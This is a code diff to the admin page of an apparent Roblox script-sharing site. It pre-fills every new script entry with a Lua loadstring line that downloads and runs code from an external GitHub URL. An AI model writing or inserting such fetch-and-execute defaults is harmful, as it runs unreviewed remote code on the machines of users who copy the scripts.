@@ -11,10 +11,12 @@ import { useAllScripts } from "@/hooks/useScripts";
 import { CATEGORIES } from "@/lib/scripts-data";
 import { Navigate, Link } from "react-router-dom";
 
+const DEFAULT_SCRIPT_CODE = `loadstring(game:HttpGet('https://raw.githubusercontent.com/checkurasshole/Script/refs/heads/main/IQ'))();`;
+
 const emptyScript = {
   title: "", slug: "", description: "", longDescription: "",
   game: "", category: "Utility", tags: [] as string[],
-  code: "", faqs: [] as { question: string; answer: string }[],
+  code: DEFAULT_SCRIPT_CODE, faqs: [] as { question: string; answer: string }[],
   trending: false, verified: true, gameUniverseId: "" as string,
   youtube_url: "" as string, is_paid: false,
 };
